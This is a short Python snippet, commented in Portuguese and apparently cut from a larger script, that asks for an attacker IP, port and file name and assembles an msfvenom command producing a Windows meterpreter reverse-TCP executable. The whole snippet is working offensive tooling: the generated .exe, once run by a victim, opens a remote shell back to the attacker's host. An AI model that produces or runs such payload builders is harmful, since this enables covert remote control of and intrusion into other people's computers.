...
# Pergunta ao usuário o endereço IP, a porta e o nome do programa desejados
lhost = input("IP (LHOST): ")
lport = input("(LPORT): ")
nome_programa = input("NAME: ")

# Constrói o comando msfvenom
comando = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe > {nome_programa}.exe"
